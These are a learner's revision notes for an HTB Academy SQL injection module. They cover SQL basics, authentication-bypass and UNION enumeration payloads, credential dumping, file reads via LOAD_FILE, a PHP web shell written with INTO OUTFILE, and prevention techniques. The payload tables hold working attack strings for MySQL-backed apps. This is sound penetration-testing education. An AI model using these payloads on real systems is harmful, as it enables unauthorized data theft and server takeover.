---
tags: [htb-academy, web-pentest, sql-injection, mysql, revision]
module: SQL Injection Fundamentals
---

# SQL Injection Fundamentals: Revision Notes

> **Legend:** Unmarked = from your module text. **(Extra)** = my own added explanation or example. **⚠ Verify** = unclear or inconsistent in the source.
> **Authorization:** Only run SQL injection techniques (reading/writing files, web shells, credential dumping) against systems you are explicitly authorized to test.
> **Assessment note:** No flags or assessment answers are included. Section 7 gives approach only.

---

## 1. Main Concepts: What, Why, How

### 1.1 Why Databases Matter to Web Apps

- **What:** Most web apps use a back-end database to store/retrieve content, user data, etc. HTTP(S) requests trigger back-end queries, sometimes built using data from the request itself.
- **Why it matters:** When user-supplied data is used to **construct** a query, an attacker can manipulate that query to do something the developer never intended — **SQL Injection (SQLi)**.
- **Scope note:** SQLi targets relational databases (MySQL, etc.); injection against non-relational databases (MongoDB, etc.) is called **NoSQL injection** (different techniques, covered elsewhere). This module focuses on **MySQL/MariaDB**.
- **Three-tier architecture (source diagram):** Tier I (client app) → Tier II (application server) → Tier III (DBMS). SQLi exploits the path where Tier II builds a query using Tier I's input before sending it to Tier III.

### 1.2 What SQL Injection Requires

1. **Inject:** break out of the expected input boundary — typically with a single quote (`'`) or double quote (`"`) — so your input stops being treated as plain data.
2. **Subvert the query logic:** use SQL syntax (operators, comments, stacked/Union queries) to change what the query does or add a new query.
3. **Retrieve output:** read the result via the page's normal output, an error message, a timing difference, or an out-of-band channel.

### 1.3 Impact / Use Cases

- **Data theft:** credentials, credit card data, other sensitive records — commonly the source of large-scale breaches whose credentials get reused elsewhere.
- **Logic subversion:** classic example is **authentication bypass** (logging in without valid credentials); also unlocking restricted features like admin panels.
- **Server compromise:** reading/writing files on the back-end, potentially placing a backdoor (web shell) and gaining full control of the server.

### 1.4 Databases & DBMS Background

- **DBMS (Database Management System):** creates/defines/hosts/manages databases. Types include file-based, Relational (RDBMS), NoSQL, Graph-based, Key/Value.
- **Key DBMS features:** Concurrency (many simultaneous users without corruption), Consistency (data stays valid), Security (authentication/permissions), Reliability (backup/rollback), SQL (intuitive query language).
- **Relational databases:**
  - Use a **schema** (template) defining the data structure.
  - Data organized into **tables** (entities) made of rows/columns; a **cell** is a row/column intersection.
  - Tables are linked via **keys** (e.g. a `users.id` referenced as `posts.user_id`) — this relationship structure is the **schema**.
  - Managed by an **RDBMS**; examples: MySQL, MariaDB, SQL Server, Oracle, PostgreSQL, Microsoft Access.
- **Non-relational (NoSQL) databases:**
  - No tables/rows/columns/primary keys/schemas in the relational sense.
  - More scalable/flexible for loosely-structured data.
  - Four common storage models: **Key-Value**, **Document-Based**, **Wide-Column**, **Graph**.
  - Example: MongoDB. Injection against these is **NoSQL injection** — a different topic, covered in a later module.

### 1.5 The Injection Mechanism (conceptual walk-through)

- **Sanitization:** removing/escaping special characters from user input to prevent it from being interpreted as code.
- **Injection (general definition):** occurs when an application misinterprets user input as code rather than as a plain string, letting the attacker change the code's execution flow.
- **Worked example from source:**
  ```php
  $searchInput = $_POST['findUser'];
  $query = "select * from logins where username like '%$searchInput'";
  ```
  - Normal input (`admin`) just becomes part of the search string.
  - Malicious input like `1'; DROP TABLE users;` adds a stray `'` that **escapes** the intended string boundary, letting the rest be interpreted as SQL.
  - **⚠ Source note:** The module's illustrative example chains a second statement after `;`, which it explicitly says is **not actually possible in MySQL** (it works in MSSQL/PostgreSQL) — it's used purely to demonstrate the *concept* of escaping boundaries. The real MySQL-specific methods (OR injection, comments, UNION) are covered in later sections.
- **Syntax errors:** An unbalanced number of quotes after injection usually causes a visible SQL syntax error — useful both as a detection signal and as something you must resolve to form a **valid** final query (via comments, or balancing quotes).

### 1.6 The Four Types of SQL Injection

| Category | Subtype | How output is retrieved |
|---|---|---|
| **In-band** | Union Based | Query result printed directly; you specify a column to read via `UNION` |
| **In-band** | Error Based | Intentionally trigger a SQL/PHP error that leaks query output |
| **Blind** | Boolean Based | Page behavior differs based on whether a conditional is true/false (no error, no direct output) |
| **Blind** | Time Based | Use `SLEEP()` to make a true condition delay the response, inferring data via timing |
| **Out-of-band** | — | Output is sent to a remote channel (e.g. DNS) you control and retrieved from there, when no direct/blind channel is usable |

- **This module's focus:** **Union Based** SQL injection only (an In-band type), as an introduction to SQLi overall.

---

## 2. Important Terminology

| Term | Short definition |
|---|---|
| SQLi | SQL Injection — manipulating a back-end SQL query via unsanitized input |
| NoSQL injection | The non-relational-database equivalent of SQLi, different techniques |
| RDBMS | Relational Database Management System (e.g. MySQL/MariaDB) |
| Schema | The relationship structure linking tables in a relational database |
| Primary key | Column uniquely identifying each row in a table |
| In-band SQLi | Injection where output is retrieved through the same channel as the request (Union/Error based) |
| Blind SQLi | Injection where no direct output is shown; inferred via True/False or timing (Boolean/Time based) |
| Out-of-band SQLi | Injection where output is exfiltrated via a separate channel (e.g. DNS) |
| Union clause | SQL clause combining results of multiple `SELECT` statements into one result set |
| `INFORMATION_SCHEMA` | Built-in MySQL database holding metadata about all databases/tables/columns |
| Fingerprinting (DBMS) | Determining which DBMS type/version is in use |
| `secure_file_priv` | MySQL global variable restricting where `LOAD_FILE`/`INTO OUTFILE` can read/write |
| `FILE` privilege | MySQL user privilege required to read/write files via SQL |
| `LOAD_FILE()` | MySQL function to read a file's contents into a query result |
| `SELECT ... INTO OUTFILE` | MySQL syntax to write query results/strings to a file on the server |
| Web shell | A script (e.g. PHP) uploaded to a server that lets an attacker execute commands remotely |
| Parameterized query / prepared statement | Query using placeholders for input, with values bound/escaped separately by the driver |
| WAF | Web Application Firewall; detects/blocks malicious requests including SQLi patterns |
| `mysqli_real_escape_string()` | PHP function that escapes special characters in input before use in a query |

---

## 3. Commands and Reference

### 3.1 MySQL Command-Line Basics

| Command | Purpose |
|---|---|
| `mysql -u root -p` | Log in as `root`, prompting for the password (safer — avoids cleartext in shell history) |
| `mysql -u root -p<password>` | Log in with the password inline (⚠ avoid — can end up in logs/history) |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | Log in to a remote host/port (`-h` host, uppercase `-P` port, default port 3306) |
| `SHOW GRANTS` | View the current user's privileges |

- **Tip from source:** No space between `-p` and the password if supplying it inline; `-P` (uppercase) is the port flag, distinct from lowercase `-p` for password.

### 3.2 Database & Table Management

```sql
CREATE DATABASE users;
SHOW DATABASES;
USE users;
```
- SQL **statements** aren't case-sensitive (`USE` = `use`), but **database/table names are case-sensitive**. Good practice: write statements in uppercase.

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
);
```
```sql
SHOW TABLES;
DESCRIBE logins;
```
- **Purpose:** `SHOW TABLES` lists tables in the current database; `DESCRIBE` shows a table's columns/types.

**Column properties:**
| Property | Meaning |
|---|---|
| `AUTO_INCREMENT` | Automatically increments a numeric column (commonly the ID) on insert |
| `NOT NULL` | Column cannot be left empty |
| `UNIQUE` | No two rows may share the same value in this column |
| `DEFAULT ...` | Default value if none is supplied (e.g. `DEFAULT NOW()`) |
| `PRIMARY KEY (col)` | Uniquely identifies each row; used to relate tables |

Full example:
```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
);
```

### 3.3 Core SQL Statements

**INSERT**
```sql
INSERT INTO table_name VALUES (col1_value, col2_value, ...);
INSERT INTO table_name(col2, col3) VALUES (val2, val3);        -- skip columns with defaults
INSERT INTO logins(username, password) VALUES ('john','john123!'), ('tom','tom123!');  -- multiple rows
```
- Skipping a `NOT NULL` column without a default causes an error.

**SELECT**
```sql
SELECT * FROM table_name;               -- all columns
SELECT column1, column2 FROM table_name; -- specific columns
```

**DROP**
```sql
DROP TABLE logins;
```
- ⚠ Permanently deletes with **no confirmation** — use with caution.

**ALTER**
```sql
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
ALTER TABLE logins MODIFY newerColumn DATE;
ALTER TABLE logins DROP newerColumn;
```

**UPDATE**
```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2 WHERE <condition>;
-- e.g.
UPDATE logins SET password = 'change_password' WHERE id > 1;
```
- A `WHERE` clause is required to target which rows get updated.

### 3.4 Controlling Query Results

**Sorting**
```sql
SELECT * FROM logins ORDER BY password;          -- ascending by default
SELECT * FROM logins ORDER BY password DESC;
SELECT * FROM logins ORDER BY password DESC, id ASC;  -- multi-column sort
```

**Limiting**
```sql
SELECT * FROM logins LIMIT 2;        -- first 2 rows
SELECT * FROM logins LIMIT 1, 2;     -- offset 1 (0-indexed), then 2 rows
```

**Filtering (`WHERE`)**
```sql
SELECT * FROM logins WHERE id > 1;
SELECT * FROM logins WHERE username = 'admin';
```
- Strings/dates need quotes (`'` or `"`); numbers don't.

**Pattern matching (`LIKE`)**
```sql
SELECT * FROM logins WHERE username LIKE 'admin%';  -- % = zero or more chars
SELECT * FROM logins WHERE username LIKE '___';      -- _ = exactly one char (3 underscores = 3-char match)
```

### 3.5 SQL Operators

| Operator | Symbol form | Behavior |
|---|---|---|
| `AND` | `&&` | True only if both conditions are true |
| `OR` | `\|\|` | True if at least one condition is true |
| `NOT` | `!` | Inverts a boolean |
| `!=` | — | Not-equal comparison |

**Operator precedence (highest to lowest, per MariaDB docs cited in source):**
1. `/`, `*`, `%` (division, multiplication, modulus)
2. `+`, `-` (addition, subtraction)
3. Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
4. `NOT` (`!`)
5. `AND` (`&&`)
6. `OR` (`||`)

- **Why this matters for SQLi:** `AND` binds tighter than `OR`, so injecting `' OR '1'='1` after an existing `AND password=...` condition changes the overall truth value in a predictable way (see §3.6).

### 3.6 Authentication Bypass Techniques

**Discovery payloads (test for SQLi):**
| Payload | URL-encoded |
|---|---|
| `'` | `%27` |
| `"` | `%22` |
| `#` | `%23` |
| `;` | `%3B` |
| `)` | `%29` |

- Use URL-encoded forms when injecting via a GET parameter in the URL.

**OR-based bypass**
```sql
-- Username field:
admin' or '1'='1
-- Resulting query:
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
- Because `AND` evaluates before `OR`, and `'1'='1'` is always true, the overall `WHERE` becomes true as long as `username='admin'` OR the forced-true condition makes the row match — works without knowing the real password.
```sql
-- Without knowing a valid username at all:
' or '1'='1
```
- This alone (as both username and injected condition) can make the entire `WHERE` clause always true, logging in as the first matching row.

**Comment-based bypass**
```sql
-- Username field:
admin'-- 
-- Resulting query (rest of line commented out):
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```
- MySQL comment styles: `--` (needs a trailing space — often written `-- -` or URL-encoded `--+` to make the space visible/preserved) and `#` (URL-encode as `%23` since `#` is treated as a URL fragment in browsers).
- **With parentheses in the query:** if the original query groups conditions in `(...)`, your injected comment must also **close the parenthesis** first, e.g. `admin')--` to produce a syntactically valid final query.

### 3.7 Union-Based Injection

**Union clause basics**
```sql
SELECT * FROM ports UNION SELECT * FROM ships;
```
- Combines rows from multiple `SELECT` statements into one result set.
- **Requirement:** both `SELECT`s must return the **same number of columns**, and matching column positions should have compatible data types.
- Mismatched column counts error: `ERROR 1222 (21000): The used SELECT statements have a different number of columns`.

**Handling uneven columns:** pad extra positions with junk data matching the expected type — numbers are convenient (also help track column position), or `NULL` (fits any type, handy for advanced cases where you don't know types yet).
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

**Step 1 — Discover the number of columns**

*Method A: `ORDER BY`*
```sql
' order by 1-- -
' order by 2-- -
...
```
- Keep incrementing until you get an error (`Unknown column 'N' in 'order clause'`) — the last successful number is the column count.

*Method B: `UNION`*
```sql
cn' UNION select 1,2,3-- -
cn' UNION select 1,2,3,4-- -
```
- Keep adjusting the count until the error (`different number of columns`) disappears — that count is the column count.

**Step 2 — Find which columns are reflected on the page**
```sql
cn' UNION select 1,2,3,4-- -
```
- Compare which of the numbers actually appear in the page output; those positions are safe to place your real payload.
- Verify with a real query instead of a literal number:
```sql
cn' UNION select 1,@@version,3,4-- -
```

### 3.8 DBMS Fingerprinting

| Payload | When to use | Expected (MySQL/MariaDB) output | Wrong output |
|---|---|---|---|
| `SELECT @@version` | Full query output visible | Version string (e.g. `10.3.22-MariaDB-1ubuntu1`) | MSSQL version on MSSQL; error elsewhere |
| `SELECT POW(1,1)` | Only numeric output available | `1` | Error on other DBMS |
| `SELECT SLEEP(5)` | Blind / no output at all | Delays response ~5s, returns `0` | No delay on other DBMS |

- **Rough heuristic (not reliable alone):** Apache/Nginx → often Linux → often MySQL; IIS → often Microsoft stack → often MSSQL. Always verify with the payloads above.

### 3.9 Database Enumeration via `INFORMATION_SCHEMA`

**Cross-database reference syntax**
```sql
SELECT * FROM my_database.users;
```
- Use the dot operator to query a table in a different database than the one currently selected.

**List databases**
```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
-- UNION version:
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
- Default/system databases to usually ignore: `information_schema`, `mysql`, `performance_schema` (and sometimes `sys`).

**Find the current database**
```sql
cn' UNION select 1,database(),2,3-- -
```

**List tables in a specific database**
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
- `TABLE_NAME` = table name; `TABLE_SCHEMA` = which database it belongs to.

**List columns in a specific table**
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

**Dump the actual data**
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
- Remember the dot operator (`dev.credentials`) when the target table is in a different database than the one the app is currently using.

### 3.10 Checking Privileges

**Current DB user**
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
-- UNION:
cn' UNION SELECT 1, user(), 3, 4-- -
```

**Superuser check**
```sql
SELECT super_priv FROM mysql.user
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
- `Y` = superuser privileges.

**Full privilege list**
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
- Look specifically for the **`FILE`** privilege — required for reading/writing files via SQL.

### 3.11 Reading Files

**Check `secure_file_priv` (governs where read/write is allowed)**
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
-- Via UNION, since global vars are exposed in INFORMATION_SCHEMA:
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

| Value | Meaning |
|---|---|
| Empty | Read/write anywhere on the filesystem (if `FILE` privilege held) — MariaDB default |
| A specific directory | Read/write restricted to that directory only |
| `NULL` | No read/write allowed anywhere — some modern configs default to this |

- **⚠ Verify:** Source states MySQL's default directory is `/var/lib/mysql-files`, distinct from MariaDB's empty-by-default behavior — confirm against the specific DBMS/version you're targeting.

**Read a file**
```sql
SELECT LOAD_FILE('/etc/passwd');
-- UNION:
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
- Requires: `FILE` privilege, permissive `secure_file_priv`, and the **OS user running MySQL** must have read access to the target file.
- **Reading source code example:** `LOAD_FILE('/var/www/html/search.php')` — note the browser may render returned HTML/PHP output rather than showing raw text; use `Ctrl+U` (view source) to see the actual leaked code.

### 3.12 Writing Files

**Requirements (all three needed):**
1. User has the `FILE` privilege.
2. `secure_file_priv` is not restrictively set (empty, or set to a directory you can use).
3. The OS user running MySQL has **write access** to the target path.

**Write query output / strings to a file**
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
- File is owned by the OS user running MySQL (e.g. `mysql:mysql`).
- **Tip from source:** `FROM_BASE64("base64_data")` can be used for advanced exports to write longer/binary files.

**Write via UNION injection**
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
- Entire `UNION` row (including junk columns) gets written; use `""` instead of numbers to keep file output clean.

**Finding the web root (if unknown):**
- Read server config via `LOAD_FILE`: Apache `/etc/apache2/apache2.conf`, Nginx `/etc/nginx/nginx.conf`, IIS `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`.
- Fuzz common web-root paths with a wordlist (Linux/Windows wordlists referenced in source).
- Infer from server error messages if available.

**Write a PHP web shell**
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
- Access it at `shell.php?0=id` to execute arbitrary commands (e.g. confirms code execution as `www-data`).
- **⚠ Serious impact:** this is full remote code execution on the back-end server — only ever do this on explicitly authorized targets.

---

## 4. SQLi Prevention Reference

| Technique | What it does | Example |
|---|---|---|
| **Input sanitization** | Escapes special characters (`'`, `"`) so they lose SQL meaning | PHP: `mysqli_real_escape_string($conn, $input)`; PostgreSQL: `pg_escape_string()` |
| **Input validation** | Restrict input to an expected pattern/format before it reaches the query | PHP: `preg_match("/^[A-Za-z\s]+$/", $input)` — reject anything that doesn't match |
| **Least-privilege DB users** | Web app's DB user only gets the minimum permissions it needs (e.g. `SELECT` on one table), never superuser/admin | `CREATE USER 'reader'@'localhost'; GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY '...';` |
| **Web Application Firewall (WAF)** | Detects/blocks malicious patterns in requests (e.g. the string `INFORMATION_SCHEMA`) before they reach the app | ModSecurity (open-source), Cloudflare (premium) |
| **Parameterized queries / prepared statements** | Input is bound as data via placeholders, never concatenated into the query string, so it can never change query structure | `mysqli_prepare($conn, "SELECT * FROM logins WHERE username=? AND password=?")` + `mysqli_stmt_bind_param($stmt, 'ss', $username, $password)` |

- **Source's conclusion:** This list is not exhaustive — application logic flaws can still open SQLi paths even with some of these in place. Examples are PHP-specific but the underlying logic applies across languages/frameworks.
- **Why least privilege matters even with good code:** If application logic is ever flawed, a low-privilege DB user limits the blast radius (e.g. the `reader` example in source can't `SELECT` from a table it wasn't granted).

---

## 5. Practical Workflow

1. **Confirm authorization and scope.**
2. **Identify likely injection points:** URL parameters, form fields, headers — anywhere user input might reach a query.
3. **SQLi discovery:** inject `'`, `"`, `#`, `;`, `)` (URL-encoded if needed) and look for SQL errors or behavior changes.
4. **Decide injection strategy** based on what you observe:
   - Error visible + want direct output → Union Based (this module's focus).
   - Need to bypass an `AND`-based login check → OR injection / comments.
5. **For auth bypass:** try `' OR '1'='1`-style payloads in username/password fields, adjusting for comments (`--`, `#`) or unbalanced parentheses as needed.
6. **For Union-based exploitation:**
   a. Determine column count (`ORDER BY` incrementing, or `UNION SELECT` with varying counts).
   b. Determine which columns are reflected on the page (use distinct numbers, then confirm with `@@version`).
   c. Fingerprint the DBMS (`@@version`, `POW(1,1)`, `SLEEP(5)`).
   d. Enumerate via `INFORMATION_SCHEMA`: `SCHEMATA` → `TABLES` (filtered by `table_schema`) → `COLUMNS` (filtered by `table_name`) → final data dump.
7. **Check privileges** (`user()`, `super_priv`, `information_schema.user_privileges`) before attempting file operations.
8. **If `FILE` privilege present:** check `secure_file_priv`, then attempt `LOAD_FILE()` for reads, or `SELECT ... INTO OUTFILE` for writes (web shell as an extreme/high-impact example).
9. **Document findings:** injection point, payload, data retrieved/impact achieved, and recommended fixes (sanitization, validation, least privilege, WAF, parameterized queries).

### Common Mistakes
- Forgetting the trailing space after `--` (or not accounting for it being URL-encoded as `--+` or shown as `-- -`).
- Using `#` directly in a browser URL, where it's treated as a fragment and never sent to the server — must URL-encode as `%23`.
- Miscounting columns and getting "different number of columns" errors repeatedly instead of systematically incrementing.
- Placing the payload in a column that isn't actually reflected on the page.
- Forgetting the dot operator (`database.table`) when the target table lives in a different database than the one currently in use.
- Not checking `secure_file_priv` before assuming file read/write will work.
- Not accounting for parentheses in the original query when crafting a comment-based bypass.
- Assuming DBMS type from the web server alone instead of fingerprinting directly.

### Troubleshooting
- **Syntax error after injecting a quote:** expected — confirms likely SQLi; now balance quotes or comment out the rest of the query.
- **"Different number of columns" error:** adjust your `UNION SELECT`/`ORDER BY` column count up or down systematically.
- **Union output just shows numbers, not real data:** you haven't replaced the junk-data column with a real query/column yet — verify position first, then substitute.
- **`LOAD_FILE()` returns `NULL`:** check `FILE` privilege, `secure_file_priv` value, and OS-level read permission on the target file.
- **`INTO OUTFILE` fails silently or errors:** check `secure_file_priv`, write permissions on the target directory, and whether the file already exists (MySQL won't overwrite an existing file with `INTO OUTFILE`) **(Extra)**.
- **Web shell doesn't execute commands:** confirm the file actually landed at the expected web-accessible path, and that you're hitting it with the right parameter name (`?0=...` in the source's example).

---

## 6. Quick Revision Sheet

### 6.1 Top 10 Things to Remember
1. SQLi happens when user input is woven into a SQL query string without sanitization, letting an attacker change query logic or add new queries.
2. Classic discovery payloads: `'`, `"`, `#`, `;`, `)` — a syntax error is a strong signal.
3. Four injection categories: In-band (Union/Error), Blind (Boolean/Time), Out-of-band — this module covers **Union Based**.
4. `AND` binds tighter than `OR`; `' OR '1'='1` style payloads exploit this to force a query true.
5. MySQL line comments: `--` (needs trailing space) and `#` (URL-encode as `%23` in browsers); comment out the remainder of a query to avoid syntax errors.
6. `UNION SELECT` requires matching column counts across both queries; find the count via `ORDER BY` (succeeds until it errors) or `UNION` (errors until it succeeds).
7. Fingerprint DBMS with `@@version`, `POW(1,1)`, or `SLEEP(5)`.
8. Enumerate via `INFORMATION_SCHEMA`: `SCHEMATA` → `TABLES` → `COLUMNS` → data, using the dot operator for cross-database queries.
9. File read/write needs: `FILE` privilege + permissive `secure_file_priv` + OS-level filesystem permissions; `LOAD_FILE()` reads, `SELECT ... INTO OUTFILE` writes (including web shells).
10. Prevention layers: input sanitization, input validation, least-privilege DB users, WAF, and — most robust — parameterized queries/prepared statements.

### 6.2 Compact Payload Reference

| Goal | Payload |
|---|---|
| Discovery | `'` / `"` / `#` / `;` / `)` |
| Auth bypass (OR) | `admin' or '1'='1` |
| Auth bypass (comment) | `admin'-- ` |
| Auth bypass (parens) | `admin')-- ` |
| Find column count (ORDER BY) | `' order by N-- -` (increment N) |
| Find column count (UNION) | `' UNION select 1,2,...,N-- -` (adjust N) |
| Confirm reflected column | `' UNION select 1,@@version,3,4-- -` |
| DBMS version | `SELECT @@version` |
| Blind/no-output fingerprint | `SELECT SLEEP(5)` |
| List databases | `UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` |
| Current database | `UNION select 1,database(),2,3-- -` |
| List tables | `UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='X'-- -` |
| List columns | `UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='Y'-- -` |
| Dump data | `UNION select 1,col1,col2,4 from db.table-- -` |
| Current user | `UNION SELECT 1, user(), 3, 4-- -` |
| Superuser check | `UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` |
| All privileges | `UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` |
| Check file read/write scope | `UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` |
| Read a file | `UNION SELECT 1, LOAD_FILE("/path"), 3, 4-- -` |
| Write a file | `union select 1,'text',3,4 into outfile '/path'-- -` |
| Write a web shell | `union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` |

### 6.3 Common Mistakes to Avoid
- Forgetting the trailing space / encoding after `--`.
- Using `#` directly in a browser URL instead of `%23`.
- Guessing column count instead of testing systematically.
- Injecting into a non-reflected column.
- Forgetting the dot operator for cross-database queries.
- Skipping the `secure_file_priv`/privilege check before attempting file operations.

### 6.4 Revision Questions

1. **What two things must an attacker achieve for a basic SQL injection to work?**
   Escape the boundary of the expected user input (e.g. with a quote), and then form a still-valid query that changes or adds to the original logic.
2. **Why does `' OR '1'='1` bypass an `AND`-based login check?**
   Because `AND` has higher precedence than `OR`; adding an always-true `OR` condition makes the overall `WHERE` clause evaluate to true regardless of the real credentials.
3. **What's the difference between the `--` and `#` MySQL comment styles in terms of practical use?**
   `--` requires a trailing space to be valid, and `#` must be URL-encoded (`%23`) when injected through a browser URL since `#` is otherwise treated as a page fragment.
4. **Name the two methods to determine the number of columns for a Union injection.**
   Incrementing `ORDER BY` until it errors, or incrementing the column count in a `UNION SELECT` until it stops erroring.
5. **Why use numbers as filler/junk data in a Union payload instead of random text?**
   They make it easy to see which columns are reflected on the page (matching the known numbers back to position), and they're broadly compatible with numeric/text column types in testing.
6. **What three `INFORMATION_SCHEMA` tables are used in the standard enumeration chain, and in what order?**
   `SCHEMATA` (databases) → `TABLES` (tables per database) → `COLUMNS` (columns per table), then query the actual table for data.
7. **What three conditions must be true to write a file via SQL injection in MySQL?**
   The DB user has the `FILE` privilege, `secure_file_priv` isn't blocking the target path, and the OS user running MySQL has write access to that path.
8. **What does an empty `secure_file_priv` value mean, versus `NULL`?**
   Empty means read/write is allowed anywhere on the filesystem (given privilege); `NULL` means no file read/write is allowed at all.
9. **Why are parameterized queries considered a stronger defense than input sanitization alone?**
   Input is passed as data bound to placeholders rather than concatenated into the query string, so it structurally cannot alter the query, unlike escaping which can be incomplete or bypassed by logic flaws.
10. **Why should a web app's database user never be a superuser/admin account?**
    Least privilege limits the damage a successful SQLi (or any flaw) can do — a low-privilege user can be restricted to exactly the tables/operations the app needs, as shown with the `reader` user example.

### 6.5 Two-Minute Final Summary

SQL injection happens when user input shapes a back-end SQL query without proper sanitization, letting an attacker escape the intended input boundary (commonly with a quote) and alter the query's logic or add new queries. Relational databases like MySQL/MariaDB use SQL; non-relational databases (MongoDB) use different, unrelated NoSQL injection techniques.

Core SQL you need: `CREATE`/`SHOW`/`USE` for databases; `CREATE TABLE`/`SHOW TABLES`/`DESCRIBE` for structure; `INSERT`, `SELECT`, `UPDATE`, `DROP`, `ALTER` for data; `ORDER BY`/`LIMIT`/`WHERE`/`LIKE` to shape results; and `AND`/`OR`/`NOT` with defined precedence (comparisons > NOT > AND > OR) that attackers exploit directly.

Basic exploitation starts with discovery payloads (`'`, `"`, `#`, `;`, `)`) looking for errors, then either OR-based payloads (`' OR '1'='1`) or comment-based payloads (`admin'-- `, `admin')-- ` for parenthesized queries) to bypass authentication logic.

Union-based injection — this module's focus — requires matching the original query's column count (found via `ORDER BY` or trial `UNION SELECT`s), identifying which columns are actually reflected on the page, then substituting junk columns with real queries. Fingerprint the DBMS (`@@version`, `POW(1,1)`, `SLEEP(5)`), then enumerate via `INFORMATION_SCHEMA`: list databases (`SCHEMATA`), tables (`TABLES`), columns (`COLUMNS`), then dump real data, using the dot operator to cross databases.

With sufficient privileges (`FILE` privilege + permissive `secure_file_priv` + OS permissions), SQLi can escalate to reading arbitrary files (`LOAD_FILE()`, including app source code) or writing files (`SELECT ... INTO OUTFILE`), up to planting a PHP web shell for full remote code execution.

Defenses layer together: escape/sanitize input (`mysqli_real_escape_string`), validate input against expected patterns (`preg_match`), enforce least-privilege database accounts, deploy a WAF, and — most robustly — use parameterized queries/prepared statements so input is never concatenated directly into SQL.

---

## 7. Skills Assessment: Approach Only

The assessment is a black-box penetration test of the "chattr" web application (HTTPS, login form), specifically focused on SQL injection. It includes setup instructions for intercepting HTTPS traffic with Burp Suite (via its integrated Chromium browser, or by installing PortSwigger's CA certificate into your own browser alongside FoxyProxy for easy proxy switching). These notes contain no answers. Use the workflow in §5: intercept the login request, test discovery payloads against each field, then apply auth-bypass and/or Union-based techniques as appropriate once SQLi is confirmed.
